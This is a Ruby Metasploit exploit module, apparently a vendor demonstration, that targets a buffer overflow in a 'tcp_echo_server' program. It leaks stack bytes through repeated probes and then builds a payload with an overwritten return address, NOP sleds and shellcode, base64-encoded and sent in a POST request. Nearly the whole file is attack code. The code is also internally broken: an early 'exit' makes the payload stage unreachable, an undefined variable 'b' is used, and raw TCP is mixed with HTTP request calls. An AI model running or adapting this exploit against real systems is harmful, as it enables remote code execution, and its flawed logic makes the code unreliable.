##
# This module requires Metasploit
##

require "test/unit"
require "base64"

class MetasploitModule < Msf::Exploit::Remote
	Rank = ManualRanking

	include Msf::Exploit::Remote::Tcp

def initialize(info = {})
	super(
		update_info(
			info,
			'Name'           => 'Polyverse tcp_echo_server example',
			'Description'    => %q|
			This is a module for exploiting a buffer overflow in tcp_echo_server
			|,
			'Author'         => 'Polyverse Corp.',
			'References'     =>
			[
				[ 'URL', 'https://polyverse.io' ],
			],
			'Platform'       => 'linux',
			'Payload'        => {},
			'Arch'           => [ARCH_X64],
			'Targets'        => 
			[
				[
					'Linux x64',
					{
						'Arch'   => ARCH_X64,
						'Ret'    => 0x7fffffffffff
					}
				]
			],
 			'DefaultTarget'  => 0
		)
	)
    
	register_options(
	[
		OptString.new('NOP', [true, 'NOP Byte Code (probably should get this from ARCH)', "\x90"]),
		OptInt.new('PREPAD', [true, 'Number of NOP instructions before payload', 100]), # Should be at least 16
		OptInt.new('POSTPAD', [true, 'Number of NOP instructions after payload', 100])
	])
end

# Returns that the remote host is always vulnerable
def check
	print_status("def check...")
	return Exploit::CheckCode::Vulnerable
end

def exploit
	print_status("start exploit...")

	def probe(n, buf)
		str = ""
		for i in 1..n
			connect
			sock.write buf 
			sleep 0.5
			buf = sock.read(buf.length+1)
			str = sprintf("%02x", buf[buf.length - 1].ord).upcase + str
			disconnect
		end
		return str, buf
	end

	def as_uint64(str)
		n = 0
		for i in 1..str.length
			n = (n << 8) + str[str.length-i].to_i(16)
		end

		return n
	end

	# Leak the 80 bytes that happen to be left on the stack (not used here, but might be interesting)
	vuln_buffer_str, buf = probe(79, "a")
	p vuln_buffer_str, ""

	# The next 8 bytes are the local variable "n"
	vuln_n_str, buf = probe(8, buf)
	p vuln_n_str, vuln_n_str.to_i(16).to_s(16), ""
	
	str, buf = probe(8, buf)
	p str, str.to_i(16).to_s(16), ""

	str, buf = probe(8, buf)
	p str, str.to_i(16).to_s(16), ""

	str, buf = probe(8, buf)
	p str, str.to_i(16).to_s(16), ""

	str, buf = probe(8, buf)
	p str, str.to_i(16).to_s(16), ""

	exit

    # First approximation of where we should return to
    ret = target.ret					# Base address of "ret" when passed a single character
    ret += 7 + 17 + 8					# Location immediately after "owned" return address
    ret += datastore['PREPAD'] / 2			# Move halfway into the pre-NOP-sled we're about to build

    # Build the payload that delivers the goods
    p = "a" * 17					# "Owned" return address is at 18..25 in the message
    p += Rex::Arch.pack_addr(target.arch, ret)		# The contents will be backpatched later
    p += datastore['NOP'] * datastore['PREPAD']		# Build a NOP sled before our shellcode
    p += payload.encoded				# Sandwich the shellcode here
    p += datastore['NOP'] * datastore['POSTPAD']	# Build a NOP sled after the shellcode (n/a right now)
    if (p.length % 3) == 0 then b += 'b' end		# Guarantee a trailing "=" after base64 encoding

    # Proceed as if this is the final payload
    print_status("p: #{p} (Length: #{p.length})")
    p64 = Base64.strict_encode64(p)			# Encode payload in base64
    print_status("p64: #{p64} (Length: #{p64.length})")

    # Deal with the side-effect of the payload size
    ret -= p64.length / 16 * 16				# Location moves based on payload size which we now know
    p[17..24] = Rex::Arch.pack_addr(target.arch, ret)	# We should be very close to the middle of the NOP sled again

    # Finalize the payload (should be the same size)
    print_status("p: #{p} (Length: #{p.length})")
    p64 = Base64.strict_encode64(p)			# Re-encode payload in base64
    print_status("p64: #{p64} (Length: #{p64.length})")

#   res = send_request_raw({'uri'=>'/index.php?q=x'})

    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path,"index.php"),
      'method'    => 'POST',
      'vars_post' => {
      'q' => p64
      }
    })

    print_status("#{res}")
    print_status("done exploit....")
  end
end
